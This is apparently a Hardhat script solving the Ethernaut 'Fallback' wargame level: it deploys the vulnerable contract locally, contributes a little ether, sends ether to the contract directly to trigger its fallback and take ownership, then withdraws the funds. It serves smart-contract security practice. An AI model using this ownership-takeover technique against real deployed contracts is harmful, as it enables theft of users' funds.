import { ethers } from "hardhat";
import { Fallback } from "../../../typechain-types/ethernaut/fallback/Fallback";
import { getSecondSigner } from "../../../utils/signer";
async function main() {
  // 1. init
  const Fallback = await ethers.getContractFactory("Fallback");

  const deployed = (await Fallback.deploy()) as Fallback;
  await deployed.deployed();
  console.log("Fallback deployed to:", deployed.address);
  console.log("current owner ", await deployed.owner());
  console.log("current owner balance ", await deployed.contributions(await deployed.owner()));

  // 2. contribute 0.0001 ether to get contribution

  const signer = await getSecondSigner();
  await deployed.connect(signer).contribute({ value: ethers.utils.parseEther("0.0001") });

  // 3. send 0.0001 ether to get ownership
  console.log("signer address ", signer.address);
  await signer.sendTransaction({
    to: deployed.address,
    from: signer.address,
    value: ethers.utils.parseEther("0.0001"),
    gasLimit: 1000000,
  });

  console.log("current owner", await deployed.owner());
  await deployed.connect(signer).withdraw();
  console.log("current owner balance ", await deployed.contributions(signer.address));

  // 4. withdraw
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
